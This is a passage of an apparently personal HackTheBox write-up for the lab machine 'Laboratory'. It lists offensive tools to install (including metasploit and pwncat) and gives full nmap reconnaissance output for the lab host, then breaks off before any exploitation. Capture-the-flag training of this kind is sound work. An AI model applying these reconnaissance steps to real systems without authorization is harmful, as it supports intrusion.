<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/Laboratory/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Laboratory | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/Laboratory/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Laboratory | CyFun"><meta data-rh="true" name="description" content="- Name: Laboratory"><meta data-rh="true" property="og:description" content="- Name: Laboratory"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/Laboratory/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Laboratory/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Laboratory/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory </a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Laboratory</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Laboratory </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Information</h1><ul><li><strong>Name:</strong> Laboratory</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/298" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><p><img loading="lazy" alt="Laboratory" src="/assets/images/laboratory-95e97f0d1d5e5382532765e4ced87547.png" width="598" height="381" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo pacman -S nmap ruby-ctf-party ffuf pwncat metasploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network enumeration" title="Direct link to Network enumeration">​</a></h2><p>Port and service discovery scan with nmap:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.91 scan initiated Sat Feb 27 21:11:02 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.216</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.216</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.031s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65532 filtered ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT    STATE SERVICE  VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp  open  http     Apache httpd 2.4.41</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: GET HEAD POST OPTIONS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Did not follow redirect to https://laboratory.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: HEAD GET POST OPTIONS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: The Laboratory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=laboratory.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Subject Alternative Name: DNS:git.laboratory.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Issuer: commonName=laboratory.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key type: rsa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key bits: 4096</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Signature Algorithm: sha256WithRSAEncryption</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2020-07-05T10:39:28</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid after:  2024-03-03T10:39:28</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| MD5:   2873 91a5 5022 f323 4b95 df98 b61a eb6c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| tls-alpn:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  http/1.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Read data files from: /usr/bin/../share/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Sat Feb 27 21:13:08 2021 -- 1 IP address (1 host up) scanned in 125.70 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="web-discovery--enumeration">Web discovery &amp; enumeration<a href="#web-discovery--enumeration" class="hash-link" aria-label="Direct link to Web discovery &amp; enumeration" title="Direct link to Web discovery &amp; enumeration">​</a></h2><p>We are directly redirected to the local domaine so let&#x27;s add it in <code>/etc/hosts</code>.</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ grep lab /etc/hosts</span><br></span><span class="token-line" 